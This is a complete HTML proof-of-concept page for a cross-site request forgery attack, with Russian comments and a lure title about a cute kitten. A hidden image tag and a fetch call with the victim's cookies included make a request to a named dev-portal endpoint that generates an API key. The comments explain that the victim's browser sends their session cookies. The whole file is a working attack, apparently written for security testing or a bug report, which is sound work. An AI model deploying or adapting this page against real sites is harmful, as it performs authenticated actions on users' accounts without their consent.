<!DOCTYPE html>
<html>
<head>
    <title>Посмотрите на этого милого котика!</title>
</head>
<body>
    <h1>Загрузка...</h1>
    <!-- Жертва открывает страницу, браузер делает GET-запрос с куками жертвы -->
    <img src="https://common-portal.drp-dev.facct.dev/portal/user/generate-api-key" style="display:none;">
    
    <!-- Альтернативный вариант, если сервер игнорирует img (например, из-за Content-Type) -->
    <script>
        fetch("https://common-portal.drp-dev.facct.dev/portal/user/generate-api-key", {
            method: "GET",
            credentials: "include" // Важно! Отправляем куки жертвы
        }).catch(e => console.log(e));
    </script>
</body>
</html>
